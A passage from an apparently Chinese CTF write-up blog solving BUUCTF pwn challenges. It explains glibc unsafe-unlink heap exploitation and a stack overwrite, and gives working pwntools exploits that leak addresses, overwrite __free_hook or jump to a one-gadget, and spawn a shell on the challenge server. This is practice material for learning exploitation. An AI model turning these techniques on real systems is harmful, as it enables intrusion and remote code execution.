punctuation">&#123;</span>                                            </span></span>    <span class="token comment">//判断chunk p的大小，是否与下一个chunk 的prev_size相等</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">//让FD指向p的下一个chunk，BK指向p的上一个chunk</span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                       BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>                                       <span class="token comment">//以上是，chunk的大小在small bin范围内的断链操作</span>    <span class="token comment">//以下是，large bin，的断链操作，首先判断FD的bk，与BK的fd是否同时指向p</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                            <span class="token comment">//首先进行初步断链，使FD的bk指向BK的fd，BK的fd指向FD，只是堆fd,bk的断链操作</span>        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>                                          BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                          <span class="token comment">//以下使堆bk_nextsize,fd_nextsize的断链操作（large bin有两个双向链表，fd，bk用来</span>        <span class="token comment">//进行FIFO操作，bk_nextsize,fd_nextsize是根据堆块的大小进行排序的链表）</span>        <span class="token comment">//以下第一个if判断p的chunk是否在small范围内</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span>                             <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token comment">//判断chunk p的下一个chunk的上一个节点，以及上一个chunk的下一个节点是不是p</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//以下是luoarge bin的断链操作，首先判断chunk p的下下一个chunk的fd_nextsize是否为空</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token comment">//p的下下一个chunk的fd_nextsize为空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>                                      <span class="token comment">//判断是否只有一个chunk p,是则如下</span>                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                             <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                                <span class="token comment">//不是以下操作，四个指针，正常的双向链表的断链操作</span>                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>                                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                                     P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                     P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                   <span class="token punctuation">&#125;</span>                                             <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                              <span class="token comment">//p的下下一个chunk的fd_nextsize不为空，直接断链</span>                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                             P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>                           <span class="token punctuation">&#125;</span>                                             <span class="token punctuation">&#125;</span>                                         <span class="token punctuation">&#125;</span>                                       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：<code>unlink</code>的判断：<code>FD-&gt;bk == BK-&gt;fd</code> </p><p>​          <code>unlink</code>的操作：<code>FD-&gt;bk = BK  </code> <code>BK-&gt;fd = FD</code></p><p>再回到这个题目，假设我们将<code>fd</code>和<code>bk</code>设置成<code>fd = note_addr - 0x18</code> <code>bk = note_addr - 0x10</code>，那么在判断的时候<code>FD-&gt;bk = BK-&gt;fd = note_addr</code>即可绕过<code>unlink</code>判断</p><p>那么在<code>unlink</code>操作的时候执行完<code>FD-&gt;bk = BK  </code> <code>BK-&gt;fd = FD</code>之后<code>note_addr = note_addr - 0x18</code>,再去<code>edit(0)</code>即可控制<code>note_addr - 0x18</code>再次更改<code>note_addr</code>的内容为<code>__free_hook</code>，再次<code>edit</code>即可改<code>__free_hook</code></p><p>经过以上分析可知：需要获取<code>code_base</code>和<code>libc_base</code>，所以在一开始泄露出来就好了</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25480</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter the index you want to create (0-10):'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter a size:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter the content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter an index:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter the content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter an index:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Enter your name: '</span><span class="token punctuation">,</span> <span class="token string">b'%11$p%15$p'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1186</span>note_addr <span class="token operator">=</span> <span class="token number">0x202060</span> <span class="token operator">+</span> code_baser<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x20830</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basefd <span class="token operator">=</span> note_addr <span class="token operator">-</span> <span class="token number">0x18</span>bk <span class="token operator">=</span> note_addr <span class="token operator">-</span> <span class="token number">0x10</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><a href="https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart">护网杯_2018_gettingstart</a></h2><p>栈题，保护全开，但是利用很简单</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hwb_2018_gettingstart  checksec pwn         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/hwb_2018_gettingstart/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主体代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">double</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">0x7FFFFFFFFFFFFFFFLL</span> <span class="token operator">&amp;&amp;</span> v6 <span class="token operator">==</span> <span class="token number">0.1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>buf</code>覆盖<code>v5</code>和<code>v6</code>为指定值即可，<code>0.1</code>在计算机中怎么表示我也不太会，但是看汇编</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000000A36 48 8B 55 E8                   mov     rdx, [rbp+var_18].text:0000000000000A3A 48 B8 FF FF FF FF FF FF FF 7F mov     rax, 7FFFFFFFFFFFFFFFh.text:0000000000000A44 48 39 C2                      cmp     rdx, rax.text:0000000000000A47 75 45                         jnz     short loc_A8E.text:0000000000000A47.text:0000000000000A49 F2 0F 10 45 F0                movsd   xmm0, [rbp+var_10].text:0000000000000A4E 66 0F 2E 05 BA 01 00 00       ucomisd xmm0, cs:qword_C10.text:0000000000000A56 7A 36                         jp      short loc_A8E.text:0000000000000A56.text:0000000000000A58 66 0F 2E 05 B0 01 00 00       ucomisd xmm0, cs:qword_C10.text:0000000000000A60 75 2C                         jnz     short loc_A8E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中有一个<code>cs:qword_C10</code>，双击进去就看到<code>0.1</code>在计算机中的值了</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.rodata:0000000000000C08 FF FF FF FF FF FF EF 7F       qword_C08 dq 7FEFFFFFFFFFFFFFh          ; DATA XREF: main+4D↑r.rodata:0000000000000C10 9A 99 99 99 99 99 B9 3F       qword_C10 dq 3FB999999999999Ah          ; DATA XREF: main+EE↑r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25389</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3fb999999999999a</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'But Whether it starts depends on you.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a><a href="https://buuoj.cn/challenges#oneshot_tjctf_2016">oneshot_tjctf_2016</a></h2><p>先检查保护，基本上没开什么保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">oneshot_tjctf_2016  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/oneshot_tjctf_2016/pwn'</span>    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3ff000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序过程就是读出指定地址的内容再执行指定地址的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__int64</span> <span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Read location?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: 0x%016lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Jump location?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good luck!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">v4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读出<code>puts_got</code>再执行<code>one gadget</code>即可</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27973</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Read location?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token 